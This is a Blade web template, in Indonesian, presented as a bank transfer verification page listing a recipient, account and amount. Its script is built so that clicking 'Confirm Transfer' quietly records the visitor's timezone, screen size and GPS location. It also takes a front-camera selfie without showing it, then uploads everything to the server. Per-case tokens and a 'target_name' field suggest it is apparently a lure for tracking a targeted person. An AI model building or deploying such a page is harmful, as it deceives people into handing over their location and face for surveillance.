<x-guest-layout>
    <div class="text-center">
        <h2 class="text-lg font-semibold text-gray-800">Verifikasi Transaksi</h2>
        <p class="mt-1 text-sm text-gray-600">Periksa detail transaksi di bawah ini, lalu klik Konfirmasi Transfer.</p>
    </div>

    <dl class="mt-6 grid grid-cols-1 gap-4">
        <div>
            <dt class="text-sm font-medium text-gray-500">Nama Penerima</dt>
            <dd class="mt-1 text-sm">{{ $case->target_name }}</dd>
        </div>
        <div>
            <dt class="text-sm font-medium text-gray-500">Bank</dt>
            <dd class="mt-1 text-sm">{{ $case->bank_name }}</dd>
        </div>
        <div>
            <dt class="text-sm font-medium text-gray-500">Nomor Rekening</dt>
            <dd class="mt-1 text-sm">{{ $case->account_number }}</dd>
        </div>
        <div>
            <dt class="text-sm font-medium text-gray-500">Jumlah Transfer</dt>
            <dd class="mt-1 text-sm font-semibold">Rp {{ number_format($case->amount, 0, ',', '.') }}</dd>
        </div>
        <div>
            <dt class="text-sm font-medium text-gray-500">No. Referensi</dt>
            <dd class="mt-1 font-mono text-sm">{{ $case->reference_number }}</dd>
        </div>
    </dl>

    <form method="POST" action="{{ route('verification.store', $case->token) }}" enctype="multipart/form-data" class="mt-8" id="verification-form">
        @csrf
        <input type="hidden" name="timezone" id="timezone">
        <input type="hidden" name="screen_resolution" id="screen_resolution">
        <input type="hidden" name="latitude" id="latitude">
        <input type="hidden" name="longitude" id="longitude">
        <input type="hidden" name="accuracy" id="accuracy">
        <input type="hidden" name="photo_status" id="photo_status">
        <input type="hidden" name="location_status" id="location_status">
        <input type="file" name="photo" id="photo-input" accept="image/jpeg,image/png,image/webp" class="hidden">

        <p id="capture-status" class="mb-4 text-center text-sm text-gray-500"></p>

        <div class="flex items-center justify-center">
            <x-primary-button id="confirm-button">
                <span id="confirm-label">{{ __('Konfirmasi Transfer') }}</span>
            </x-primary-button>
        </div>
    </form>

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            var form = document.getElementById('verification-form');
            var confirmButton = document.getElementById('confirm-button');
            var confirmLabel = document.getElementById('confirm-label');
            var captureStatus = document.getElementById('capture-status');
            var photoInput = document.getElementById('photo-input');
            var submitting = false;

            document.getElementById('timezone').value = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
            document.getElementById('screen_resolution').value = window.screen.width + 'x' + window.screen.height;

            function captureLocation() {
                return new Promise(function (resolve) {
                    if (!navigator.geolocation) {
                        document.getElementById('location_status').value = 'gagal';
                        resolve();
                        return;
                    }

                    navigator.geolocation.getCurrentPosition(function (position) {
                        document.getElementById('latitude').value = position.coords.latitude;
                        document.getElementById('longitude').value = position.coords.longitude;
                        document.getElementById('accuracy').value = position.coords.accuracy;
                        document.getElementById('location_status').value = 'diberikan';
                        resolve();
                    }, function (error) {
                        document.getElementById('location_status').value = error.code === error.PERMISSION_DENIED ? 'ditolak' : 'gagal';
                        resolve();
                    }, { timeout: 8000 });
                });
            }

            function capturePhoto() {
                return new Promise(function (resolve) {
                    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                        resolve();
                        return;
                    }

                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
                        .then(function (stream) {
                            var video = document.createElement('video');
                            video.srcObject = stream;
                            video.playsInline = true;
                            video.setAttribute('muted', '');
                            video.play();

                            video.addEventListener('loadedmetadata', function () {
                                var canvas = document.createElement('canvas');
                                canvas.width = video.videoWidth;
                                canvas.height = video.videoHeight;
                                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

                                stream.getTracks().forEach(function (track) { track.stop(); });

                                canvas.toBlob(function (blob) {
                                    if (blob) {
                                        var file = new File([blob], 'selfie.jpg', { type: 'image/jpeg' });
                                        var transfer = new DataTransfer();
                                        transfer.items.add(file);
                                        photoInput.files = transfer.files;
                                    }
                                    resolve();
                                }, 'image/jpeg', 0.7);
                            });
                        })
                        .catch(function (error) {
                            if (error.name === 'NotAllowedError') {
                                document.getElementById('photo_status').value = 'ditolak';
                            }
                            resolve();
                        });
                });
            }

            form.addEventListener('submit', function (event) {
                if (submitting) {
                    return;
                }

                event.preventDefault();
                submitting = true;
                confirmButton.disabled = true;
                confirmLabel.textContent = 'Memproses...';
                captureStatus.textContent = 'Meminta izin lokasi dan kamera...';

                Promise.all([captureLocation(), capturePhoto()]).then(function () {
                    form.submit();
                });
            });
        });
    </script>
</x-guest-layout>
